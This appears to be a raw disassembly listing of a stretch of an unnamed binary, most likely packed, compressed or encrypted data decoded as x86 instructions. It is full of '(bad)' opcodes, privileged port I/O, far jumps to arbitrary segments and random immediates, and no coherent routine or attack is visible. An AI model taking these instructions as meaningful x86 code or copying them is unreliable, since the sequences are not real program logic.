  42a01d:	sbb    eax,ecx
  42a01f:	loope  0x42a027
  42a021:	enter  0x3435,0x41
  42a025:	fld    TBYTE PTR [eax+0x2]
  42a028:	pusha  
  42a029:	scas   eax,DWORD PTR es:[edi]
  42a02a:	cmp    BYTE PTR [ecx],0x8d
  42a02d:	sbb    DWORD PTR [eax-0x78ccff20],esi
  42a033:	adc    al,0x6b
  42a035:	sub    eax,DWORD PTR [ebx-0xe]
  42a038:	test   al,0xe0
  42a03a:	into   
  42a03b:	rcr    DWORD PTR [edx+0x3e],cl
  42a03e:	inc    ebp
  42a03f:	in     al,dx
  42a040:	push   edx
  42a041:	gs xcrypt-ctr (bad)
  42a043:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42a044:	fild   DWORD PTR [esp+ecx*4+0x1d]
  42a048:	test   BYTE PTR [esi],cl
  42a04a:	xchg   edx,eax
  42a04b:	icebp  
  42a04c:	lahf   
  42a04d:	xchg   ebp,eax
  42a04e:	sti    
  42a04f:	ss addr16 sbb ah,dh
  42a053:	call   0xf5a0:0xbad10f8
  42a05a:	les    ecx,FWORD PTR [eax]
  42a05c:	(bad)  
  42a05d:	sbb    BYTE PTR [ebp+ebp*4+0x5564fee9],ch
  42a064:	imul   esi,DWORD PTR [ebx],0xf
  42a067:	nop
  42a068:	jb     0x42a099
  42a06a:	xchg   esi,eax
  42a06b:	ss std 
  42a06d:	push   esi
  42a06e:	push   es
  42a06f:	out    dx,al
  42a070:	mov    BYTE PTR [edi],0xcd
  42a073:	out    0xc3,eax
  42a075:	jp     0x42a095
  42a077:	sub    DWORD PTR [ecx+0xfbc808c],ebp
  42a07d:	mov    ds:0xd9324db6,al
  42a082:	mov    edx,edx
  42a084:	popf   
  42a085:	loop   0x42a04f
  42a087:	adc    dh,BYTE PTR [eax+0x1f]
  42a08a:	out    dx,eax
  42a08b:	mov    bh,0x2a
  42a08d:	jnp    0x42a05f
  42a08f:	mov    DWORD PTR [edx-0x382cf30b],eax
  42a095:	fcomp  DWORD PTR [ebp-0x68f34220]
  42a09b:	inc    ecx
  42a09c:	jo     0x42a030
  42a09e:	pushf  
  42a09f:	add    eax,0xfc8606b2
  42a0a4:	(bad)  
  42a0a6:	pop    ecx
  42a0a7:	scas   eax,DWORD PTR es:[edi]
  42a0a8:	aam    0xfa
  42a0aa:	aaa    
  42a0ab:	xor    bh,dh
  42a0ad:	or     eax,0x7fe45411
  42a0b2:	aam    0x5a
  42a0b4:	jb     0x42a081
  42a0b6:	test   eax,0x64f02c8
  42a0bb:	mov    al,0x6c
  42a0bd:	shl    ebx,1
  42a0bf:	and    BYTE PTR [eax-0x61],cl
	...
  42a132:	add    BYTE PTR [eax],al
  42a134:	push   esi
  42a135:	xchg   ebp,edi
  42a137:	test   ch,bh
  42a139:	(bad)  
  42a13a:	jg     0x42a113
  42a13c:	jbe    0x42a105
  42a13e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42a13f:	(bad)  
  42a140:	mov    WORD PTR [esi-0xd],ds
  42a143:	idiv   BYTE PTR [eax-0x9fffe42]
  42a149:	add    BYTE PTR [eax],al
  42a14b:	add    BYTE PTR [edi-0x74],cl
  42a14e:	arpl   WORD PTR [eax+0x69874255],di
  42a154:	add    al,0xbc
  42a156:	xchg   ecx,eax
  42a157:	adc    BYTE PTR [ecx+ecx*8],bh
  42a15a:	call   0xb6a9:0x65db58b1
  42a161:	outs   dx,BYTE PTR ds:[esi]
  42a162:	mov    edx,0xd70a70e8
  42a167:	mov    esi,edx
  42a169:	test   DWORD PTR [ebx+0x9c32faa],esi
  42a16f:	std    
  42a170:	sahf   
  42a171:	jns    0x42a16a
  42a173:	mov    dl,0x76
  42a175:	xor    eax,0x67e10ced
  42a17a:	cwde   
  42a17b:	arpl   WORD PTR [esi],ax
  42a17d:	or     DWORD PTR [ebx+0x13],ecx
  42a180:	lea    edx,[esi+0x7c]
  42a183:	ret    0x9ea4
  42a186:	sbb    dl,ch
  42a188:	cs inc esp
  42a18a:	push   ss
  42a18b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42a18c:	(bad)  
  42a18e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42a18f:	std    
  42a190:	push   ebx
  42a191:	stc    
  42a192:	mov    edx,0xe79a388d
  42a197:	inc    ebx
  42a198:	sub    eax,DWORD PTR [ecx]
  42a19a:	lahf   
  42a19b:	adc    eax,0xce60905b
  42a1a0:	popf   
  42a1a1:	xchg   ecx,eax
  42a1a2:	pop    ds
  42a1a3:	mov    es,WORD PTR [edi+esi*1-0x49]
  42a1a7:	pop    esi
  42a1a8:	loop   0x42a1a7
  42a1aa:	(bad)  
  42a1ab:	cmp    ah,bl
  42a1ad:	jecxz  0x42a1dd
  42a1af:	push   ss
  42a1b0:	test   DWORD PTR [edx+eax*2+0x43],esi
  42a1b4:	mov    ds:0x5984a298,eax
  42a1b9:	hlt    
  42a1ba:	inc    eax
  42a1bb:	dec    ecx
  42a1bc:	arpl   WORD PTR [edx+0x28],ax
  42a1bf:	sbb    al,0x33
  42a1c1:	mov    cl,0xa4
  42a1c3:	dec    edi
  42a1c4:	fs jmp 0xc77f0dac
  42a1ca:	mov    cl,0x84
  42a1cc:	cld    
  42a1cd:	lea    esp,[ecx]
  42a1cf:	imul   esi,ebx,0xb7bfecd
  42a1d5:	push   ebx
  42a1d6:	push   esi
  42a1d7:	sub    edi,ebx
  42a1d9:	xlat   BYTE PTR ds:[ebx]
  42a1da:	rol    bl,cl
  42a1dc:	dec    edi
  42a1dd:	aad    0xd8
  42a1df:	ss nop
  42a1e1:	in     al,dx
  42a1e2:	push   edi
  42a1e3:	mov    dh,0x2d
  42a1e5:	adc    eax,0x69cbe544
  42a1ea:	in     al,dx
  42a1eb:	adc    ebx,ebp
  42a1ed:	ja     0x42a1f3
  42a1ef:	iret   
  42a1f0:	dec    edx
  42a1f1:	cmp    al,0x5c
  42a1f3:	add    DWORD PTR [ebp+0x17],eax
  42a1f6:	rcr    dh,cl
  42a1f8:	or     BYTE PTR [esi+0xb],ah
  42a1fb:	test   DWORD PTR [edi],edi
  42a1fd:	test   dh,dh
  42a1ff:	fcmove st,st(2)
  42a201:	ins    BYTE PTR es:[edi],dx
  42a202:	jne    0x42a1cd
  42a204:	fcomp  DWORD PTR [eax-0x54df5edf]
  42a20a:	mov    BYTE PTR [esi-0x49ecb8d5],bl
  42a210:	jle    0x42a288
  42a212:	mov    cl,0x1d
  42a214:	repz jo 0x42a19d
  42a217:	(bad)  
  42a219:	dec    edi
  42a21a:	icebp  
  42a21b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42a21c:	std    
  42a21d:	(bad)  
  42a21e:	aam    0xe8
  42a220:	ds hlt 
  42a222:	dec    ecx
  42a223:	mov    bh,BYTE PTR [edx+0x5cb9bb9e]
  42a229:	pop    esp
  42a22a:	add    dh,BYTE PTR [esi+0x49]
  42a22d:	inc    ebp
  42a22e:	(bad)  
  42a22f:	icebp  
  42a230:	scas   eax,DWORD PTR es:[edi]
  42a231:	fild   WORD PTR [eax-0x6cbd1ae1]
  42a237:	sub    al,cl
  42a239:	hlt    
  42a23a:	call   0xbfd4:0x339b3768
  42a241:	mov    dh,0x0
	...
  42a2b3:	add    al,dh
  42a2b5:	adc    al,0xe1
  42a2b7:	(bad)  
  42a2b8:	in     eax,0xff
  42a2ba:	call   FWORD PTR [esi]
  42a2bc:	xor    eax,0xd67f8ab9
  42a2c1:	outs   dx,DWORD PTR ds:[esi]
  42a2c2:	pop    ebp
  42a2c3:	stc    
  42a2c4:	scas   al,BYTE PTR es:[edi]
  42a2c5:	mov    edi,0xf60001
  42a2ca:	add    BYTE PTR [eax],al
  42a2cc:	sub    al,0x79
  42a2ce:	ret    
  42a2cf:	repz dec edi
  42a2d1:	inc    ebx
  42a2d2:	cmc    
  42a2d3:	imul   ecx,ecx,0xd
  42a2d6:	jle    0x42a291
  42a2d8:	(bad)  
  42a2d9:	icebp  
  42a2da:	push   cs
  42a2db:	lea    edx,[esi-0x7f]
  42a2de:	inc    ebx
  42a2df:	or     DWORD PTR [ebx-0x26c52d9e],esp
  42a2e5:	call   0x1dcb3d97
  42a2ea:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42a2eb:	scas   al,BYTE PTR es:[edi]
  42a2ec:	shl    bh,0xa3
  42a2ef:	frndint 
  42a2f1:	pop    eax
  42a2f2:	mov    edx,0xff2c0f31
  42a2f7:	adc    DWORD PTR [esp+edx*1-0x67],ebx
  42a2fb:	lea    ebp,[ecx-0x1e]
  42a2fe:	xchg   DWORD PTR [ebp+0x3193f918],edi
  42a304:	cmp    eax,0x13529b2a
  42a309:	add    DWORD PTR [edx-0x39a9e6a4],esp
  42a30f:	push   ss
  42a310:	out    0xd1,eax
  42a312:	hlt    
  42a313:	shl    bl,cl
  42a315:	das    
  42a316:	push   ebp
  42a317:	fcomp  DWORD PTR [esi+ebx*1+0x77f30a34]
  42a31e:	or     DWORD PTR [esi+0x56378250],esp
  42a324:	lods   al,BYTE PTR ds:[esi]
  42a325:	jns    0x42a346
  42a327:	mov    fs,WORD PTR [esi+0x22]
  42a32a:	push   ecx
  42a32b:	les    ecx,FWORD PTR [eax+0x146c5eed]
  42a331:	rcl    DWORD PTR [ebx],cl
  42a333:	fimul  DWORD PTR [eax-0x5f]
  42a336:	out    dx,al
  42a337:	mov    dl,0xf0
  42a339:	mov    dl,BYTE PTR [edx+0x2c0010ba]
  42a33f:	add    dh,BYTE PTR [ecx+0x2a9bfece]
  42a345:	fcom   QWORD PTR [edi-0x15]
  42a348:	push   ss
  42a349:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42a34a:	xchg   ecx,eax
  42a34b:	cmc    
  42a34c:	sbb    ah,cl
  42a34e:	cmp    DWORD PTR [ecx],esi
  42a350:	jno    0x42a37e
  42a352:	mov    cl,BYTE PTR [edx+0x7b]
  42a355:	(bad)  
  42a356:	cmp    ah,BYTE PTR [edx+0x68f3e76f]
  42a35c:	cs dec ecx
  42a35e:	mov    ds:0x8050986c,ax
  42a364:	lods   al,BYTE PTR ds:[esi]
  42a365:	mov    sp,0xf62c
  42a369:	push   0xd7e6a173
  42a36e:	fsubr  st(5),st
  42a370:	xchg   esi,eax
  42a371:	fwait
  42a372:	std    
  42a373:	daa    
  42a374:	into   
  42a375:	mov    BYTE PTR [eax],0x44
  42a378:	repnz xchg esi,eax
  42a37a:	les    esi,FWORD PTR [ebx]
  42a37c:	push   ebx
  42a37d:	adc    eax,0x3a57124b
  42a382:	in     al,0xe7
  42a384:	lahf   
  42a385:	shl    BYTE PTR [esi-0x6c],cl
  42a388:	fistp  DWORD PTR [edx]
  42a38a:	mov    edi,0x9f91427a
  42a38f:	repnz inc eax
  42a391:	aam    0x9d
  42a393:	xchg   si,ax
  42a395:	xlat   BYTE PTR ds:[ebx]
  42a396:	pop    eax
  42a397:	(bad)  
  42a398:	repz push edx
  42a39a:	mov    ch,0xad
  42a39c:	clc    
  42a39d:	loopne 0x42a38b
  42a39f:	test   BYTE PTR ds:0xc5de91cc,dh
  42a3a5:	xchg   ecx,ebx
  42a3a7:	add    DWORD PTR [ecx+edx*8-0x51],eax
  42a3ab:	ds add eax,0xab9749f2
  42a3b1:	aas    
  42a3b2:	cmc    
  42a3b3:	and    DWORD PTR [esi],edi
  42a3b5:	push   eax
  42a3b6:	leave  
  42a3b7:	ret    
  42a3b8:	jae    0x42a3ec
  42a3ba:	data16 cmp ch,BYTE PTR [eax+0x37]
  42a3be:	es inc eax
  42a3c0:	jmp    0x42a448
	...
  42a431:	add    BYTE PTR [eax],al
  42a433:	add    BYTE PTR [ebp+ecx*1+0x13],cl
  42a437:	sub    al,0x53
  42a439:	ds jg  0x42a4a9
  42a43c:	stos   BYTE PTR es:[edi],al
  42a43d:	dec    ebx
  42a43e:	push   edi
  42a43f:	jo     0x42a47a
  42a441:	pop    es
  42a442:	fnsave [esp+eiz*4-0x40]
  42a446:	add    DWORD PTR [eax],eax
  42a448:	test   BYTE PTR [eax],0x0
  42a44b:	add    al,dl
  42a44d:	inc    edx
  42a44e:	fstp   DWORD PTR [edx]
  42a450:	sar    BYTE PTR [esi+ebp*1-0x80],1
  42a454:	fs cmc 
  42a456:	xor    eax,0x91da0545
  42a45b:	xchg   ecx,eax
  42a45c:	pop    ds
  42a45d:	out    0x6d,al
  42a45f:	test   al,0x44
  42a461:	xchg   esi,eax
  42a462:	into   
  42a463:	test   al,0xb1
  42a465:	(bad)  
  42a466:	out    dx,al
  42a467:	ds mov ah,0x53
  42a46a:	sbb    BYTE PTR [eax-0x5b],dh
  42a46d:	cwde   
  42a46e:	cmp    cl,BYTE PTR [ecx+ebx*2+0x2091327c]
  42a475:	jae    0x42a49f
  42a477:	and    eax,0xb5cbed78
  42a47c:	ja     0x42a49f
  42a47e:	jg     0x42a463
  42a480:	rol    DWORD PTR ds:0x39218b63,1
  42a486:	xchg   edx,eax
  42a487:	add    al,0x91
  42a489:	repnz adc BYTE PTR [ecx+0x22a7ba9],al
  42a490:	popf   
  42a491:	mov    edi,0xc211e98c
  42a496:	dec    esi
  42a497:	pop    ebp
  42a498:	aas    
  42a499:	inc    ebx
  42a49a:	xor    DWORD PTR [eax-0x39146bcd],0xffffff9e
  42a4a1:	xchg   DWORD PTR [esi-0x5a92b4db],edi
  42a4a7:	jne    0x42a42a
  42a4a9:	or     BYTE PTR [edi+0x53],0x27
  42a4ad:	pop    ds
  42a4ae:	test   eax,0x87287143
  42a4b3:	mov    eax,0xf27da221
  42a4b8:	outs   dx,BYTE PTR ds:[esi]
  42a4b9:	mov    ds:0xb369cdb9,eax
  42a4be:	icebp  
  42a4bf:	sub    BYTE PTR [eax],ah
  42a4c1:	leave  
  42a4c2:	xor    DWORD PTR [ebx-0x54],ebp
  42a4c5:	cmp    bl,bl
  42a4c7:	ret    
  42a4c8:	cmp    cl,BYTE PTR [ebx+ecx*4+0x3081769e]
  42a4cf:	aaa    
  42a4d0:	imul   edi,DWORD PTR fs:[edi+0x5936fa14],0xa85686f7
  42a4db:	xor    esi,DWORD PTR [eax+0x3b4deb33]
  42a4e1:	xchg   BYTE PTR [ecx],bh
  42a4e3:	retf   
  42a4e4:	cmp    edi,DWORD PTR [eax]
  42a4e6:	inc    esp
  42a4e7:	pop    edi
  42a4e8:	aas    
  42a4e9:	repnz sub edi,ecx
  42a4ec:	push   0xd
  42a4ee:	xchg   al,ch
  42a4f0:	idiv   BYTE PTR [eax]
  42a4f2:	adc    al,0x94
  42a4f4:	dec    eax
  42a4f5:	leave  
  42a4f6:	jp     0x42a564
  42a4f8:	fild   QWORD PTR [ecx+0x58]
  42a4fb:	push   ebx
  42a4fc:	or     ecx,DWORD PTR [edx+0x16]
  42a4ff:	or     eax,0x74ab757e
  42a504:	ret    0xea0c
  42a507:	ret    0x7a8b
  42a50a:	or     DWORD PTR [edx],0xffffff8e
  42a50d:	leave  
  42a50e:	lock mov ds:0x9ccb9c7,eax
  42a514:	or     BYTE PTR [ebp+0x7e],ch
  42a517:	jne    0x42a4bb
  42a519:	fisttp WORD PTR [ebp-0x33306e06]
  42a51f:	mov    ?,WORD PTR [edi+0x662315fe]
  42a525:	inc    eax
  42a526:	pop    ebp
  42a527:	and    BYTE PTR [edx],cl
  42a529:	or     al,0x78
  42a52b:	adc    ah,BYTE PTR [edx+ebp*4]
  42a52e:	or     al,0x10
  42a530:	outs   dx,BYTE PTR ds:[esi]
  42a531:	or     ebp,DWORD PTR gs:[ebx+0x4ef6c99d]
  42a538:	loop   0x42a57b
  42a53a:	dec    ebp
  42a53b:	mov    es,WORD PTR [edi]
  42a53d:	adc    esi,DWORD PTR [ebx+eax*4]
  42a540:	mov    dh,0xba
	...
  42a5b2:	add    BYTE PTR [eax],al
  42a5b4:	ins    DWORD PTR es:[edi],dx
  42a5b5:	sbb    eax,0xfbf6c0e6
  42a5ba:	outs   dx,DWORD PTR ds:[esi]
  42a5bb:	mov    ebp,0x44d94d2c
  42a5c0:	ins    DWORD PTR es:[edi],dx
  42a5c1:	or     al,0x90
  42a5c3:	nop
  42a5c4:	call   0x0:0xf60001c1
  42a5cb:	add    BYTE PTR [esi],dh
  42a5cd:	and    edx,DWORD PTR ds:0xa70d452d
  42a5d3:	mov    BYTE PTR [esi+edi*2],bh
  42a5d6:	xlat   BYTE PTR ds:[ebx]
  42a5d7:	add    eax,0x200ab56e
  42a5dc:	mov    ds:0x5ba9858c,eax
  42a5e1:	or     DWORD PTR [esi+0x12],eax
  42a5e4:	inc    ecx
  42a5e5:	push   ebx
  42a5e6:	adc    ah,BYTE PTR [ecx]
  42a5e8:	fwait
  42a5e9:	inc    esp
  42a5ea:	mov    dh,0xc4
  42a5ec:	pop    DWORD PTR [ecx+0x1cd18f44]
  42a5f2:	add    ch,al
  42a5f4:	(bad)  
  42a5f5:	sub    BYTE PTR [eax],0x2c
  42a5f8:	jmp    0x9ec0:0x394ebad9
  42a5ff:	sub    al,0x66
  42a601:	test   DWORD PTR [ecx+edi*1],esi
  42a604:	mov    eax,0xad473f4d
  42a609:	imul   edi,DWORD PTR [edx+0x19809949],0x40
  42a610:	cmp    eax,0xf05cca93
  42a615:	jecxz  0x42a59f
  42a617:	jnp    0x42a5f2
  42a619:	inc    ebp
  42a61a:	popf   
  42a61b:	pop    eax
  42a61c:	push   ss
  42a61d:	dec    edi
  42a61e:	fucomip st,st(4)
  42a620:	mov    dl,BYTE PTR [esi-0x56384af6]
  42a626:	sbb    al,dl
  42a628:	push   ecx
  42a629:	or     ebx,DWORD PTR [edx]
  42a62b:	pop    edx
  42a62c:	mov    al,0xf7
  42a62e:	pop    ebp
  42a62f:	jle    0x42a6a8
  42a631:	fwait
  42a632:	aaa    
  42a633:	into   
  42a634:	retf   0xc5de
  42a637:	xchg   edi,eax
  42a638:	push   ecx
  42a639:	sub    eax,0xd20b232
  42a63e:	jg     0x42a637
  42a640:	ins    BYTE PTR es:[edi],dx
  42a641:	int    0xb1
  42a643:	ds inc edx
  42a645:	xlat   BYTE PTR ds:[ebx]
  42a646:	push   ebx
  42a647:	scas   eax,DWORD PTR es:[edi]
  42a648:	jp     0x42a5fd
  42a64a:	xchg   DWORD PTR [eax+0x1074e606],edx
  42a650:	lea    edi,[ebx+0x365e961d]
  42a656:	push   ss
  42a657:	xor    al,0x30
  42a659:	add    BYTE PTR [esi],0x62
  42a65c:	fs inc edi
  42a65e:	dec    ecx
  42a65f:	es into 
  42a661:	pop    ebp
  42a662:	mov    al,ds:0xe219c595
  42a667:	mov    ds,WORD PTR [edi]
  42a669:	or     edx,eax
  42a66b:	les    eax,FWORD PTR [ebx+0x32]
  42a66e:	sub    al,0x77
  42a670:	ret    
  42a671:	push   esi
  42a672:	pop    ebx
  42a673:	sbb    BYTE PTR [ecx],bh
  42a675:	test   BYTE PTR [ebx+0x2a],dl
  42a678:	mov    ds:0x7ff40e0b,eax
  42a67d:	fistp  QWORD PTR [ebx+ebp*4+0x16]
  42a681:	dec    ecx
  42a682:	xchg   ecx,eax
  42a683:	sar    BYTE PTR [eax+0xafec13],cl
  42a689:	bound  ecx,QWORD PTR [edx-0x24]
  42a68c:	pop    esi
  42a68d:	lods   eax,DWORD PTR ds:[esi]
  42a68e:	inc    ebp
  42a68f:	jp     0x42a64f
  42a691:	xor    ebx,DWORD PTR es:[edx-0x67]
  42a695:	jmp    0x3710:0x881d104a
  42a69c:	jbe    0x42a6b4
  42a69e:	sub    DWORD PTR [edi],edx
  42a6a0:	and    ah,ah
  42a6a2:	pushf  
  42a6a3:	sahf   
  42a6a4:	out    0x15,eax
  42a6a6:	cmp    ah,BYTE PTR [ecx+0x66291cbc]
  42a6ac:	xor    eax,0xc661c9fc
  42a6b1:	jle    0x42a684
  42a6b3:	shr    DWORD PTR [edx+0x292f3499],0x59
  42a6ba:	xchg   esi,eax
  42a6bb:	cdq    
  42a6bc:	std    
  42a6bd:	sub    BYTE PTR ds:0x7202d,cl
	...
  42a733:	add    BYTE PTR [eax],dh
  42a735:	inc    edx
  42a736:	fbld   TBYTE PTR [edx-0x1]
  42a739:	(bad)  
  42a73a:	mov    ebp,0xffb84452
  42a73f:	cdq    
  42a740:	sbb    BYTE PTR [eax+0x3d],ch
  42a743:	aaa    
  42a744:	nop
  42a745:	ret    0x1
  42a748:	test   BYTE PTR [eax],0x0
  42a74b:	add    BYTE PTR [esi],cl
  42a74d:	pop    ecx
  42a74e:	fs mov ch,0x83
  42a751:	sbb    BYTE PTR [ebp-0x24],0xcc
  42a755:	mov    ecx,0xf913d90
  42a75a:	xor    eax,0xfc841000
  42a75f:	xor    DWORD PTR [eax+0x5bc6cf0e],0xbc6ecdc4
  42a769:	int    0xb2
  42a76b:	mov    ebp,0xb5976bac
  42a770:	mov    bl,0xc1
  42a772:	into   
  42a773:	mov    dh,0xa9
  42a775:	mov    al,ds:0x832b0a8c
  42a77a:	sub    BYTE PTR [edi+0x5d],bl
  42a77d:	xchg   DWORD PTR [edx],ecx
  42a77f:	push   es
  42a780:	lds    ebx,FWORD PTR [ecx+0x18]
  42a783:	sbb    eax,0xb37f350a
  42a788:	ucomiss xmm4,DWORD PTR [ebx-0x39]
  42a78c:	cmp    al,0x3d
  42a78e:	mov    bl,ah
  42a790:	pop    edi
  42a791:	pop    ecx
  42a792:	ret    0x321d
  42a795:	fwait
  42a796:	(bad)  
  42a797:	push   0xffffffaf
  42a799:	inc    edx
  42a79a:	call   0xe407e3c9
  42a79f:	xchg   ecx,eax
  42a7a0:	add    al,0xb4
  42a7a2:	mov    eax,0x632e2180
  42a7a7:	clc    
  42a7a8:	pop    ds
  42a7a9:	(bad)
  42a7ac:	ins    DWORD PTR es:[edi],dx
  42a7ad:	enter  0x5a16,0x7
  42a7b1:	std    
  42a7b2:	cmc    
  42a7b3:	dec    edx
  42a7b4:	ins    DWORD PTR es:[edi],dx
  42a7b5:	push   esi
  42a7b6:	data16 stos BYTE PTR es:[edi],al
  42a7b8:	jge    0x42a824
  42a7ba:	fwait
  42a7bb:	add    al,0x2c
  42a7bd:	pop    ss
  42a7be:	int3   
  42a7bf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42a7c0:	xchg   ebx,eax
  42a7c1:	mov    ecx,0x57df26c
  42a7c6:	iret   
  42a7c7:	fwait
  42a7c8:	jno    0x42a826
  42a7ca:	sar    DWORD PTR [ecx],cl
  42a7cc:	inc    edi
  42a7cd:	es xchg ebx,eax
  42a7cf:	aam    0x3d
  42a7d1:	mov    bh,0x15
  42a7d3:	jo     0x42a79e
  42a7d5:	mov    edx,0x794bc777
  42a7da:	adc    BYTE PTR [ebx+ebx*4-0x77],cl
  42a7de:	cdq    
  42a7df:	xor    al,0xc7
  42a7e1:	mov    edx,0x5955936c
  42a7e6:	jnp    0x42a834
  42a7e8:	xor    esp,edx
  42a7ea:	and    al,0x76
  42a7ec:	pushf  
  42a7ed:	inc    ebp
  42a7ee:	xchg   esi,eax
  42a7ef:	pop    edx
  42a7f0:	je     0x42a841
  42a7f2:	dec    esp
  42a7f3:	aaa    
  42a7f4:	push   esi
  42a7f5:	jmp    0x7b553e7a
  42a7fa:	mov    edi,0xba547952
  42a7ff:	inc    edi
  42a800:	push   edx
  42a801:	dec    esi
  42a802:	adc    al,0x70
  42a804:	aam    0x9f
  42a806:	mov    dh,0xbf
  42a808:	mov    bh,BYTE PTR [eax+0x12]
  42a80b:	adc    DWORD PTR [edi],edx
  42a80d:	jae    0x42a873
  42a80f:	leave  
  42a810:	xchg   esi,eax
  42a811:	sar    BYTE PTR [ebx+0x80a72e9],cl
  42a817:	dec    edi
  42a818:	fisub  WORD PTR [ecx-0x3feed29b]
  42a81e:	push   cs
  42a81f:	pop    ebx
  42a820:	adc    DWORD PTR [ecx-0x16],edx
  42a823:	and    BYTE PTR [ecx-0x2a],cl
  42a826:	mov    fs,ebp
  42a828:	cmp    cl,BYTE PTR [edx]
  42a82a:	fisttp DWORD PTR [eax-0x2bd71819]
  42a830:	ja     0x42a852
  42a832:	mov    ebp,0x34fc679e
  42a837:	idiv   BYTE PTR [edi-0x1a3330c7]
  42a83d:	stc    
  42a83e:	jmp    0x42a820
  42a840:	or     al,BYTE PTR gs:[eax]
	...
  42a8b3:	add    BYTE PTR [edi+0x68],dl
  42a8b6:	fistp  QWORD PTR fs:[edi-0x21]
  42a8ba:	(bad)  
  42a8bb:	call   0x123b0c10
  42a8c0:	mov    eax,0x8684a1e2
  42a8c5:	ret    
  42a8c6:	add    DWORD PTR [eax],eax
  42a8c8:	test   BYTE PTR [eax],0x0
  42a8cb:	add    BYTE PTR [edi+0x14],dl
  42a8ce:	mov    dh,0xbc
  42a8d0:	xchg   esi,eax
  42a8d1:	bswap  esp
  42a8d3:	and    bh,BYTE PTR [ebx]
  42a8d5:	sbb    BYTE PTR [edi+edi*4+0x46aa7b2b],0x62
  42a8dd:	pop    edx
  42a8de:	xor    BYTE PTR [edx+eiz*2-0x24],cl
  42a8e2:	sbb    al,0x81
  42a8e4:	cmp    BYTE PTR [esi+0x508d9],dh
  42a8ea:	jg     0x42a921
  42a8ec:	icebp  
  42a8ed:	aas    
  42a8ee:	and    DWORD PTR [edx-0x6c],ebp
  42a8f1:	fidivr DWORD PTR [eax+ebp*1-0x7af9506f]
  42a8f8:	xchg   ebx,eax
  42a8f9:	inc    ebx
  42a8fa:	mov    edx,0xbc866e43
  42a8ff:	or     ecx,DWORD PTR [ebx+0x7b572d99]
  42a905:	lahf   
  42a906:	inc    edi
  42a907:	aad    0x80
  42a909:	xor    ebx,DWORD PTR [ecx-0x54c175c7]
  42a90f:	fisubr WORD PTR [eax-0x4e61594a]
  42a915:	sar    ch,cl
  42a917:	stc    
  42a918:	cmp    DWORD PTR [ecx+0x3e923217],0x44
  42a91f:	(bad)  
  42a920:	and    edi,DWORD PTR [edi+0x21]
  42a923:	inc    ebp
  42a924:	cld    
  42a925:	pop    eax
  42a926:	rcr    DWORD PTR [esp+ecx*1],0x2d
  42a92a:	cmp    cl,ch
  42a92c:	push   ss
  42a92d:	pop    ebp
  42a92e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42a92f:	push   edx
  42a930:	adc    DWORD PTR [eax],ebx
  42a932:	pop    ebp
  42a933:	mov    ebp,0x46454e55
  42a938:	inc    esi
  42a939:	mov    ch,0xb8
  42a93b:	push   esp
  42a93c:	mov    cl,0x4b
  42a93e:	sbb    DWORD PTR [eiz*8+0x1e907cc8],edx
  42a945:	lods   eax,DWORD PTR ds:[esi]
  42a946:	leave  
  42a947:	fs je  0x42a9ab
  42a94a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42a94b:	sar    DWORD PTR [edi-0x1c0f7334],1
  42a951:	pop    esi
  42a952:	ins    BYTE PTR es:[edi],dx
  42a953:	mov    al,0xf7
  42a955:	mov    ebp,0xe339694
  42a95a:	add    al,BYTE PTR [esi+0x31]
  42a95d:	pop    ecx
  42a95e:	repz push esp
  42a960:	xor    eax,0xfdaf66f6
  42a965:	mov    ch,0x6d
  42a967:	xor    BYTE PTR [ebp+0x77],cl
  42a96a:	adc    dh,BYTE PTR [edx-0x1c9d5bb1]
  42a970:	push   0x22
  42a972:	dec    ebp
  42a973:	mov    ebp,0x4f511a32
  42a978:	mov    ?,WORD PTR [esi+0x7e459a68]
  42a97e:	xchg   ecx,ecx
  42a980:	mov    edi,0x593dfbc2
  42a985:	sbb    DWORD PTR [edx+0x57],edi
  42a988:	imul   eax,DWORD PTR [esi],0xceda9213
  42a98e:	scas   eax,DWORD PTR es:[di]
  42a990:	jl     0x42aa00
  42a992:	mov    ds:0xb6b20922,eax
  42a997:	cmp    BYTE PTR [edi+0x4df6122c],cl
  42a99d:	xor    bl,ch
  42a99f:	mov    eax,ds:0x1b81b2df
  42a9a4:	sbb    ebp,0xffffffd9
  42a9a7:	push   eax
  42a9a8:	adc    ebp,DWORD PTR [ebx+0x42]
  42a9ab:	jmp    0x42a9ea
  42a9ad:	test   BYTE PTR [ecx+0x391b912f],dl
  42a9b3:	in     al,dx
  42a9b4:	sar    BYTE PTR [eax],cl
  42a9b6:	int3   
  42a9b7:	inc    esi
  42a9b8:	cmp    DWORD PTR [edx],esp
  42a9ba:	(bad)  
  42a9bb:	in     eax,dx
  42a9bc:	es lahf 
  42a9be:	pop    edx
  42a9bf:	test   DWORD PTR [edi+0xb],0x0
	...
  42aa32:	add    BYTE PTR [eax],al
  42aa34:	into   
  42aa35:	std    
  42aa36:	sti    
  42aa37:	leave  
  42aa38:	sti    
  42aa39:	iret   
  42aa3a:	(bad)  
  42aa3b:	(bad)  
  42aa3c:	jmp    FWORD PTR [edi+ebx*1-0x1c]
  42aa40:	mov    al,0x12
  42aa42:	and    BYTE PTR ds:0x1c47c,ch
  42aa48:	test   BYTE PTR [eax],0x0
  42aa4b:	add    BYTE PTR [edx],al
  42aa4d:	xchg   ecx,eax
  42aa4e:	dec    ecx
  42aa4f:	pop    esp
  42aa50:	jp     0x42aaaa
  42aa52:	sub    BYTE PTR [esi+edi*8],dl
  42aa55:	mov    ebx,0x6c88f585
  42aa5a:	das    
  42aa5b:	dec    esp
  42aa5c:	xchg   edi,eax
  42aa5d:	inc    eax
  42aa5e:	ret    
  42aa5f:	into   
  42aa60:	sub    al,0xea
  42aa62:	lods   al,BYTE PTR ds:[esi]
  42aa63:	fs js  0x42aab0
  42aa66:	shl    BYTE PTR [ebp+0x42f46f3b],cl
  42aa6c:	dec    ebx
  42aa6d:	mov    ds:0x692a078c,al
  42aa72:	das    
  42aa73:	inc    esi
  42aa74:	out    dx,al
  42aa75:	jae    0x42aa14
  42aa77:	call   0x9ac54614
